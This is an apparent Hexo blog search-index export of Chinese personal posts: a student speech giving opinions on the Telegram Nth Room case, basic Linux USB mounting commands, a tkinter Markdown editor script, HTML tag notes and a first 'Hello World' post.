        <content type="html"><![CDATA[<h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>地狱空荡荡 恶魔在人间</p><p>想必在座各位多少看过这句话，这就是我今天要说的有关Telegram N号房事件的一些东西；由于案情复杂，我就不再赘述，有兴趣的请自行百度<br>主要人物介绍：<a id="more"></a><br>赵主彬：现年25岁，信息通信专业，曾担任学报编辑部编辑。多次获得奖学金。3年内参加了50多次志愿活动。<br>就是这么一个表面人畜无害的优秀学生，主导了这么一起事件。<br>对此人进行分析，我们不难得出：平台用telegram，交易用比特币，说明罪犯反侦查意识高，思维敏捷，可以归类为高智商信息犯罪；内心自卑，但是外围性格特征表现为自负，因无法达到自身的高度预期郁不得志，因此可能存在社会偏见，有一定概率发展为反社会型人格；可能存在家庭暴力，且是父权家庭；社交能力较差，排斥甚至仇视女性，这点可以从他在被捕后的言论发表矢口不谈对女性的道歉这一点可以看出。</p><p>有的孩子是孩子，有的孩子是禽兽<br>这十几年都塞了什么进脑子里<br>人名不打码，马赛克做错了什么</p><p>就像这些评论所表述的一样，我也痛恨这些精虫上脑的东西。但是几乎一边倒的网络舆论显然有些问题：这26万人个个都罪该万死吗？考虑到涉案人数及案件的复杂程度，我个人觉得其中还是不乏被教唆的，受蒙骗的，甚至不明情况的。不是说强行洗白，而是我认为每个人看待事情都应该有自己的看法，有那种不被舆论大势所动摇的那种看法。<br>大家是否看过这样一个比喻：韩国目前在运营的出租车大概有26万辆，这意味着在韩国的大街上，遇到N号房会员就像遇到出租车一样频繁。<br>不知各位对这个比喻有什么看法<br>在我看来，这是一种下意识的情景描绘，旨在放大案件涉及的范围，而这种情景描绘于我来看除了放大恐慌之外没有任何用处，那他们这么做的目的何在呢？要我说要不就是公众号博人眼球，要不就涉及到黑公关带节奏，由于这是一个国家级的案件，比起背后大到令人无法想象的黑灰产业链，我还是更倾向于前者。</p><p>最后，引用了几句某些公众号的评价作为我对此事的看法，话很粗，但理不粗：<br>作为一个成年人，要学会克制，不该馋的不要馋。<br>我知道现在是春天，但只有野狗才不分场合、不分对象，时刻想着交配。<br>何况，野狗也只在春秋两季才发情</p><h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><p>由于班级组织的演讲限时3分钟，所以我不得不把原本一千多字的演讲稿删为800多字，也因此缺失了很多事件的细节及个人的观点。<br>–2020.05.07</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux下利用命令行对U盘和电脑中的文件进行操作</title>
      <link href="2021/04/10/Operations%20between%20flash%20disk%20and%20linux%20os/"/>
      <url>2021/04/10/Operations%20between%20flash%20disk%20and%20linux%20os/</url>
      
        <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fdisk -l<span class="comment">#查看接入设备名称</span></span><br><span class="line">mount /dev/sda1 /mnt <span class="comment">#挂载U盘</span></span><br><span class="line">ls /mnt<span class="comment">#查看U盘文件</span></span><br><span class="line">cp file directory<span class="comment">#复制指定文件file至指定目录directory</span></span><br><span class="line">ls /mnt<span class="comment">#再次查看U盘文件</span></span><br><span class="line">umount /mnt<span class="comment">#卸载U盘</span></span><br></pre></td></tr></table></figure><div class="note "><p><strong>标题（可选）</strong></p><p>提示：<br>若操作中出现错误，请查看权限是否正确，或在每次操作前加’sudo’<br>cp后的文件和路径需带路径(个人推荐绝对路径)</p></div>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown_Editor V1.0</title>
      <link href="2021/04/10/Markdown_Editor%20V1.0/"/>
      <url>2021/04/10/Markdown_Editor%20V1.0/</url>
      
        <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">\<span class="comment"># -*- coding=utf-8 -*- </span></span><br><span class="line">import tkinter</span><br><span class="line">import os</span><br><span class="line">from tkinter import filedialog</span><br><span class="line"></span><br><span class="line">win_size=<span class="string">&#x27;450x550&#x27;</span></span><br><span class="line">win = tkinter.Tk()</span><br><span class="line">win.geometry(win_size)</span><br><span class="line"></span><br><span class="line">win.title(<span class="string">&#x27;Markdown Editor V1.0 (hexo only)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def processandsave():</span><br><span class="line">   contents = <span class="string">&#x27;---\ntitle:&#x27;</span> + title.get(<span class="string">&#x27;0.0&#x27;</span>,<span class="string">&#x27;end&#x27;</span>) + <span class="string">&#x27;tags:&#x27;</span> + tags.get(<span class="string">&#x27;0.0&#x27;</span>,<span class="string">&#x27;end&#x27;</span>) + <span class="string">&#x27;---\n&#x27;</span> + content.get(<span class="string">&#x27;0.0&#x27;</span>,<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">   filename = filedialog.asksaveasfilename()</span><br><span class="line">   <span class="keyword">if</span> filename is not None:</span><br><span class="line">       with open(file=filename,mode=<span class="string">&#x27;w&#x27;</span>) as file:</span><br><span class="line">           file.write(str(contents))</span><br><span class="line">           title.delete(<span class="string">&#x27;0.0&#x27;</span>,<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">           tags.delete(<span class="string">&#x27;0.0&#x27;</span>,<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">           content.delete(<span class="string">&#x27;0.0&#x27;</span>,<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line"></span><br><span class="line">def add_bash():</span><br><span class="line">    add_content=add_bash_text.get(<span class="string">&#x27;0.0&#x27;</span>,<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">    add_content=add_content.rstrip()</span><br><span class="line">    changing_content=<span class="string">&#x27;```bash\n&#x27;</span>+add_content+<span class="string">&#x27;\n```\n&#x27;</span></span><br><span class="line">    content.insert(<span class="string">&#x27;end&#x27;</span>,changing_content)</span><br><span class="line">    add_bash_text.delete(<span class="string">&#x27;0.0&#x27;</span>,<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line"></span><br><span class="line">label1=tkinter.Label(text=<span class="string">&#x27;标题&#x27;</span>,padx=10,pady=10)</span><br><span class="line">label1.grid(row=0,column=0)</span><br><span class="line"></span><br><span class="line">title=tkinter.Text(width=40,height=2)</span><br><span class="line">title.grid(row=0,column=1,columnspan=2)</span><br><span class="line"></span><br><span class="line">label2=tkinter.Label(text=<span class="string">&#x27;标签&#x27;</span>,padx=5,pady=5)</span><br><span class="line">label2.grid(row=1,column=0)</span><br><span class="line"></span><br><span class="line">tags=tkinter.Text(width=30,height=1)</span><br><span class="line">tags.grid(row=1,column=1)</span><br><span class="line"></span><br><span class="line">label3=tkinter.Label(text=<span class="string">&#x27;正文&#x27;</span>,padx=5,pady=5)</span><br><span class="line">label3.grid(row=2,column=0)</span><br><span class="line"></span><br><span class="line">content=tkinter.Text(width=40,height=20)</span><br><span class="line">content.grid(row=2,column=1,rowspan=5)</span><br><span class="line"></span><br><span class="line">add_bash_button=tkinter.Button(win,text=<span class="string">&#x27;命令行&#x27;</span>,<span class="built_in">command</span>=add_bash)</span><br><span class="line">add_bash_button.grid(row=9,column=0)</span><br><span class="line"></span><br><span class="line">add_bash_text=tkinter.Text(width=40,height=5)</span><br><span class="line">add_bash_text.grid(row=9,column=1)</span><br><span class="line"></span><br><span class="line">save_button=tkinter.Button(win,text=<span class="string">&#x27;保存&#x27;</span>,<span class="built_in">command</span>=processandsave)</span><br><span class="line">save_button.grid(row=8,column=1)</span><br><span class="line"></span><br><span class="line">win.mainloop()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thanksgiving</title>
      <link href="2021/04/10/img_share/"/>
      <url>2021/04/10/img_share/</url>
      
        <content type="html"><![CDATA[<p><img src="https://www.helloimg.com/images/2020/11/28/bb7b96be-d4be-4657-b90c-a5f1df2909619ac20bd2ad5eb347.jpg" class="lazyload" data-srcset="https://www.helloimg.com/images/2020/11/28/bb7b96be-d4be-4657-b90c-a5f1df2909619ac20bd2ad5eb347.jpg" srcset="data:image/png;base64,666" alt="arknights_20201128"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>HTML笔记</title>
      <link href="2021/04/10/HTML_notes/"/>
      <url>2021/04/10/HTML_notes/</url>
      
        <content type="html"><![CDATA[<pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line">1 &lt;h1&gt; to &lt;/h6&gt;: 一到六号标题</span><br><span class="line">2 &lt;p&gt;段落&lt;/p&gt;</span><br><span class="line">3 &lt;body style=<span class="string">&quot;background-color:PowderBlue;&quot;</span>&gt;</span><br><span class="line">  &lt;p style=<span class="string">&quot;font-family:verdana;color:red&quot;</span>&gt;对段落样式进行修改&lt;/p&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">4 &lt;br /&gt;&lt;hr /&gt;&lt;!这是注释，前面的是换行和分割线&gt;</span><br><span class="line">5 &lt;b&gt;被加粗的内容&lt;/b&gt;</span><br><span class="line">6 &lt;strong&gt;被...加粗的内容...吧&lt;/strong&gt;</span><br><span class="line">7 &lt;big&gt;被加大的内容&lt;/big&gt;</span><br><span class="line">8 &lt;em&gt;被强调(加斜)的内容&lt;/em&gt;</span><br><span class="line">9 &lt;i&gt;被...意大利式加斜的内容&lt;/i&gt;</span><br><span class="line">10 &lt;small&gt;被减小的内容&lt;/small&gt;</span><br><span class="line">11 &lt;sub&gt;位于右下角的小字部分&lt;/sub&gt;</span><br><span class="line">12 &lt;sup&gt;位于右上角的小字部分&lt;/sup&gt;</span><br><span class="line">13 &lt;pre&gt;预格式文本(保留了空格和换行)&lt;/pre&gt;</span><br><span class="line">14 &lt;code&gt;用于&lt;/code&gt;,&lt;kbd&gt;显示&lt;/kbd&gt;,&lt;samp&gt;代码&lt;/samp&gt;,&lt;var&gt;这个加大加粗了一点&lt;/var&gt;</span><br><span class="line">15 &lt;address&gt;用于书写地址，其中记得手动添加换行标签&lt;/address&gt;</span><br><span class="line">16 &lt;abbr title=<span class="string">&quot;etcetera&quot;</span>&gt;etc.&lt;/abbr&gt;</span><br><span class="line">17 &lt;acronym title=<span class="string">&quot;World Wide Web&quot;</span>&gt;WWW&lt;/acronym&gt;</span><br><span class="line">18 &lt;bdo dir=<span class="string">&quot;rtl&quot;</span>&gt;印打序倒&lt;/bdo&gt;</span><br><span class="line">19 &lt;blockquote&gt;块引用&lt;/blockquote&gt;,&lt;q&gt;短引用&lt;/q&gt;</span><br><span class="line">20 &lt;p&gt;你看&lt;del&gt;我被划掉了&lt;/del&gt;&lt;ins&gt;又被加下划线了&lt;/ins&gt;&lt;/p&gt;</span><br><span class="line">21 &lt;a name=<span class="string">&quot;tips&quot;</span>&gt;基本的注意事项 - 有用的提示&lt;/a&gt; &lt;a href=<span class="string">&quot;#tips&quot;</span>&gt;有用的提示&lt;/a&gt;</span><br><span class="line">22 &lt;img src=<span class="string">&quot;url&quot;</span> width=xx height=xx align=xxx /&gt;</span><br><span class="line">23 &lt;table border=<span class="string">&quot;1&quot;</span>&gt;</span><br><span class="line">     &lt;tr&gt;</span><br><span class="line">     &lt;th&gt;Heading&lt;/th&gt;</span><br><span class="line">     &lt;th&gt;Another Heading&lt;/th&gt;</span><br><span class="line">     &lt;/tr&gt;</span><br><span class="line">     &lt;tr&gt;</span><br><span class="line">     &lt;td&gt;row 1, cell 1&lt;/td&gt;</span><br><span class="line">     &lt;td&gt;row 1, cell 2&lt;/td&gt;</span><br><span class="line">     &lt;/tr&gt;</span><br><span class="line">     &lt;tr&gt;</span><br><span class="line">     &lt;td&gt;row 2, cell 1&lt;/td&gt;</span><br><span class="line">     &lt;td&gt;row 2, cell 2&lt;/td&gt;</span><br><span class="line">     &lt;/tr&gt;</span><br><span class="line">     &lt;/table&gt;</span><br><span class="line">24 &lt;ul&gt;&lt;!unsorted list&gt;</span><br><span class="line">     &lt;li&gt;Coffee&lt;/li&gt;</span><br><span class="line">     &lt;li&gt;Milk&lt;/li&gt;</span><br><span class="line">     &lt;/ul&gt;</span><br><span class="line">25 &lt;ol&gt;&lt;!ordered list&gt;</span><br><span class="line">     &lt;li&gt;Coffee&lt;/li&gt;</span><br><span class="line">     &lt;li&gt;Milk&lt;/li&gt;</span><br><span class="line">     &lt;/ol&gt;</span><br><span class="line">26 &lt;dl&gt;&lt;!defined list&gt;</span><br><span class="line">     &lt;dt&gt;Coffee&lt;/dt&gt;</span><br><span class="line">     &lt;dd&gt;Black hot drink&lt;/dd&gt;</span><br><span class="line">     &lt;dt&gt;Milk&lt;/dt&gt;</span><br><span class="line">     &lt;dd&gt;White cold drink&lt;/dd&gt;</span><br><span class="line">     &lt;/dl&gt;</span><br><span class="line">27 &lt;head&gt;</span><br><span class="line">     &lt;style&gt;</span><br><span class="line">     .cities &#123;</span><br><span class="line">         background-color:black;</span><br><span class="line">         color:white;</span><br><span class="line">         margin:20px;</span><br><span class="line">         padding:20px;</span><br><span class="line">     &#125; </span><br><span class="line">     &lt;/style&gt;</span><br><span class="line">     &lt;/head&gt;</span><br><span class="line">28 &lt;!DOCTYPE html&gt;</span><br><span class="line">     &lt;html&gt;</span><br><span class="line">     &lt;head&gt;</span><br><span class="line">     &lt;style&gt;</span><br><span class="line">       span.red &#123;color:red;&#125;</span><br><span class="line">     &lt;/style&gt;</span><br><span class="line">     &lt;/head&gt;</span><br><span class="line">     &lt;body&gt;</span><br><span class="line"></span><br><span class="line">     &lt;h1&gt;My &lt;span class=<span class="string">&quot;red&quot;</span>&gt;Important&lt;/span&gt; Heading&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">     &lt;/body&gt;</span><br><span class="line">     &lt;/html&gt;</span><br><span class="line">29 &lt;iframe src=<span class="string">&quot;demo_iframe.htm&quot;</span> width=<span class="string">&quot;200&quot;</span> height=<span class="string">&quot;200&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line">30 &lt;body background=<span class="string">&quot;http://www.w3school.com.cn/clouds.gif&quot;</span>&gt;</span><br><span class="line">31 &lt;script <span class="built_in">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><br><span class="line">     document.write(<span class="string">&quot;Hello World!&quot;</span>)</span><br><span class="line">     &lt;/script&gt;</span><br><span class="line">     &lt;noscript&gt;Your browser does not support JavaScript!&lt;/noscript&gt;</span><br></pre></td></tr></table></figure></pre><p><a href="https://www.w3school.com.cn/html/html_quick.asp">Quick Search</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>0</title>
      <link href="2020/03/22/0/"/>
      <url>2020/03/22/0/</url>
      
        <content type="html"><![CDATA[<h2 id="Hello-World！"><a href="#Hello-World！" class="headerlink" title="Hello,World！"></a>Hello,World！</h2><p>说人话 我终于有自己的网站啦 虽然只是部署在github上的<br>先做个测试 下回在看看要弄啥<br>peach..啊不…<br>peace～～</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
